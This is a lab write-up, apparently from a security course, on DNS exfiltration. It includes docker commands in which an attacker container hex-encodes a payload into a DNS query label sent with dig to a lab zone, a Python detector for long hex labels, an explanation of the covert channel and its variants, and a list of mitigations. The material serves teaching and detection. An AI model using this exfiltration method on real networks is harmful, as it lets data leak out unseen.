# 07 — DNS Exfiltration (L7 Data Tunnelling)

**Layer:** L7 / application · **Objective:** leak data out of a network by
encoding it into DNS query labels, then detect that leak from the resolver
log with a simple heuristic script.

## Lab parameters

| Parameter | Value |
|---|---|
| Compose project | `k10` |
| Zone | `k10.exfil.lab` |
| Resolver | `dns` service (`uts-dnsmasq`) |
| Payload | NIM, hex-encoded |

## Method

```bash
docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml up -d

# Encode the payload as a hex label
echo -n 19552011024 | xxd -p

# Send it upstream inside a DNS query
docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml exec attacker \
  dig +short <hex>.k10.exfil.lab @dns

# Capture the resolver log and run the detector
docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k10.log

# Decode the label back to the original payload
echo <hex> | xxd -r -p

docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml down -v
```

The detector flags any first label that is both **longer than 30 characters**
and **pure hexadecimal** — a shape that normal hostnames almost never have:

```python
label = nama.split(".")[0]
if len(label) > 30 and re.fullmatch(r"[0-9a-fA-F]+", label):
    mencurigakan.append((len(label), nama))
```

## Result

- The query appears in the resolver log; the detector prints it under
  **"Query mencurigakan"** with its label length.
- Decoding the label with `xxd -r -p` returns the original payload — the data
  left the host and was reconstructed from DNS alone.

![Detector output on the resolver log](docs/evidence/07-dns-exfiltration/01-detect.png)
![Payload recovered from the query label](docs/evidence/07-dns-exfiltration/02-decode.png)

## Why it works

DNS is one of the few protocols a network practically cannot block. It is
allowed outbound from nearly every network because name resolution is
foundational, so it becomes a covert channel: the attacker registers a domain
they control, runs an authoritative resolver on it, and encodes stolen data
into the **leftmost label** of a query. UDP/53 traffic looks like ordinary
resolution, and the receiving nameserver simply logs the label and reconstructs
the payload. Variants use TXT records, DNS-over-HTTPS, or a chain of subdomains
to defeat frequency and length thresholds.

Volume is small per query but the channel is persistent and hard to distinguish
from legitimate traffic without content inspection.

## Mitigation

- **Log and monitor DNS.** Every query leaving the network is a record; the
  heuristic above catches the naive case. Baseline per-host query rates and
  alert on deviation.
- **Short-label/long-label and entropy analysis** at the resolver: high-entropy
  labels, unusually long labels, or a spike of `NXDOMAIN` responses indicate a
  tunnel.
- **Response Policy Zones (RPZ)** / blocklists to block known exfil domains and
  newly registered domains at the resolver.
- **Force all DNS through a controlled internal resolver** — block outbound
  UDP/TCP 53 at the firewall so clients cannot reach external resolvers
  directly. This restores visibility and is the single highest-value control.
- **Restrict egress** to what is needed; the fewer protocols allowed out, the
  fewer covert channels exist.

## Evidence

| File | Shows |
|---|---|
| `01-detect.png` | Detector flagging the long hex label in the resolver log |
| `02-decode.png` | Original payload recovered from the label |
